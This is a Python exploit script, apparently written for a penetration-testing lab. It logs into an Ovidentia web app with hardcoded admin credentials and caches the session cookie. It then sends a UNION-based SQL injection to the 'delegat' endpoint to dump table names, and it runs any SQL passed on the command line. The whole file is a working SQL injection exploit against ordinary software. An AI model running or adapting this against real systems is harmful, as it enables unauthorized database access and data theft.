import requests, sys, pickle
from bs4 import BeautifulSoup
from os.path import exists

url = 'http://10.11.1.73:8080/PHP'
cookie_filename = '.admin_cookie'
base_cmd = 'UNION Select (select group_concat(TABLE_NAME,"\r\n") from information_Schema.tables where TABLE_SCHEMA = %27ovidentia%27 ORDER BY TABLE_NAME DESC LIMIT 10),2 --'


def main(argv):

	global url, base_cmd

	if(len(argv) < 1):
		sqlcmd = base_cmd
		print(base_cmd)
	else:
		sqlcmd = argv[0]

	url = 'http://10.11.1.73:8080/PHP'
	test = f'http://10.11.1.73:8080/PHP/index.php?tg=delegat&idx=mem&id=1 {sqlcmd}'

	cookie = get_cookie_latest()
	if (cookie == ''):
		cookie = get_cookie()

	rt = requests.get(f"{url}/index.php")

	login_proof = 'You are not yet logged in'

	if (login_proof in rt.text):
		cookie = get_cookie()

	r = requests.get(test, cookies=cookie)

	soup = BeautifulSoup(r.text, 'html.parser')
	data = soup.find('input',{"name": "users[]"})
	print(str(data)[45:-3].replace(',',''))


def get_cookie():
	global url, cookie_filename
	data = "tg=login&referer=index.php&login=login&sAuthType=Ovidentia&nickname=admin%40admin.bab&password=012345678&submit=Login"
	headers = { "Referer": "http://10.11.1.73:8080/PHP/index.php?tg=login&cmd=authform&msg=Login&err=",
	"Content-Type": "application/x-www-form-urlencoded",
	"Origin": "http://10.11.1.73:8080",
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
	"Content-Length": "117"}
	s = requests.Session()
	s.get(url)
	r = s.post(f'{url}/index.php', headers=headers, data=data, proxies={"http":"http://127.0.0.1:8080"}, allow_redirects=True)

	with open(cookie_filename, 'wb') as f:
		pickle.dump(s.cookies, f)

	return s.cookies

def get_cookie_latest():
	global cookie_filename
	if(exists(cookie_filename)):
		with open(cookie_filename, 'rb') as f:
			try:
				return pickle.load(f)
			except:
				return ''
	else:
		return ''



if __name__ == "__main__":
   main(sys.argv[1:])